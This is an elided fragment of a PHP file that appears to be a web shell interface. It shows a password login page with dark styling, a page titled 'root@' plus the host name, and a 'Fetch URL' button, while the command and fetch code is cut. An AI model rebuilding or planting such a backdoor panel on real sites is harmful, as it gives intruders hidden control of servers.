...
if (!isset($_SESSION['logged_in'])) {
    ...
    <head>
        <title>Login</title>
        <style>
            body { background-color: #1a1a1a; color: #ddd; font-family: monospace; text-align: center; padding: 50px; }
            form { background-color: #2e2e2e; padding: 20px; border-radius: 8px; display: inline-block; }
            input { background-color: #222; border: 1px solid #444; color: #ddd; padding: 10px; margin: 10px; }
            button { background-color: #00FF00; color: #111; border: none; padding: 10px 20px; cursor: pointer; }
        </style>
    </head>
    <body>
        <h2>Enter Password</h2>
        <?php if (isset($login_error)) echo '<p style="color: #ff5555;">' . $login_error . '</p>'; ?>
        <form method="POST">
...
<head>
    ...
    <title>root@<?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?></title>
    <style>
html {
    font-size: 15px;
}
...
<a href="javascript:toggleFetcher();" class="btn-modern"><i class="fas fa-link"></i> Fetch URL</a>
      ...
      <a href="?logout" class="btn-modern" style="background-color:#dc3545;"><i class="fas fa-sign-out-alt"></i> Logout</a>
    </div>
</div>
